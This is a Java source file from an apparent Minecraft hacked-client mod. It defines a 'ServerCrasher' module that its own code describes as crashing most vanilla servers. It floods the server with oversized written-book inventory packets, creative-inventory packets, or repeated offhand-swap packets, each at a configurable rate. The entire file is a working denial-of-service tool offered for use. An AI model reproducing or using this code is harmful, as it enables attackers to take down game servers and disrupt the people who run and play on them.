package unlimited.litehacks.mods.exploit;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import org.lwjgl.glfw.GLFW;
import unlimited.litehacks.mods.Module;
import unlimited.litehacks.mods.settings.BooleanSetting;
import unlimited.litehacks.mods.settings.ModeSetting;
import unlimited.litehacks.mods.settings.NumberSetting;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class ServerCrasher extends Module {

    public NumberSetting crashAmount = new NumberSetting("Speed", 0, 2000, 1, 0.1);
    public BooleanSetting crashPacker = new BooleanSetting("SEX", true);
    public ModeSetting crashType = new ModeSetting("Type", "Ghost book", "Ghost book", "Packet", "Swap");

    public ServerCrasher() {
        super("ServerCrasher", "Crashes most vanilla servers", Category.EXPLOIT);
        addSettings(crashAmount, crashPacker, crashType);
    }

    @Override
    public void onEnable() {
        assert mc.player != null;

    }

    @Override
    public void onDisable() {
        assert mc.player != null;

        super.onDisable();
    }

    @Override
    public void onTick() {
        assert mc.player != null;
        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        NbtList list = new NbtList();
        NbtCompound tag = new NbtCompound();
        String author = "LitePlus";
        String title = "\n LiteFUcks \n";
        String size = "";
        int pages = 50;
        int pageChars = 210;

        if (!(mc.player == null)) {
                if (crashType.isMode("Ghost book")) {
                    IntStream chars = new Random().ints(0x20, 0x7E);
                    size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
                    for (int i = 0; i < pages; i++) {
                        NbtString tString = NbtString.of(size);
                        list.add(tString);
                    }
                    tag.putString("author", author);
                    tag.putString("title", title);
                    tag.put("pages", list);
                    bookObj.setSubNbt("pages", list);
                    bookObj.setNbt(tag);

                    for (int i = 0; i < crashAmount.getValueInt(); i++) {

                            Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
                            map.put(0, bookObj);
                            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
                    }
                }

            if (crashType.isMode("Packet")) {
                for (int i = 0; i < crashAmount.getValueInt(); i++) {
                    mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
                }
            }

            if (crashType.isMode("Swap")) {
                for (int i = 0; i < crashAmount.getValueInt(); i++) {
                    mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
                    if (crashPacker.isEnabled()) {
                        mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
                    }
                }
            }


        }
        super.onTick();
    }



}
